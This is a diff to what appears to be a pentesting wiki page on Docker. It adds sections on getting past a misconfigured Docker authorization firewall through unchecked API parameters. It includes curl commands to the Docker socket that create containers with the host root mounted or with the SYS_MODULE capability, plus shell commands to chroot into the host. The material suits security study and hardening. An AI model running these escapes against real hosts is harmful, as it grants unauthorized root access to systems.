@@ -893,9 +893,10 @@ Note that maybe you cannot mount the folder `/tmp` but you can mount a **differe
 Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges \(maybe modifying `/etc/shadow`\)
 {% endhint %}
 
-### Curl communication
+### Unchecked JSON Structure
 
-Apparently it may be possible to **bypass a docker firewall by interacting directly with the docker socket using `curl`**:
+It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the API \([https://docs.docker.com/engine/api/v1.40/\#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)\) like "**Binds**".  
+In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root \(/\) folder of the host:
 
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
@@ -907,7 +908,19 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 
+### Unchecked JSON Attribute
 
+It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parametter** of the API \([https://docs.docker.com/engine/api/v1.40/\#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)\) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:
+
+```bash
+docker version
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
+docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
+docker ps
+docker exec -it c52a77629a91 bash
+capsh --print
+#You can abuse the SYS_MODULE capability
+```
 
 ## Use containers securely
 
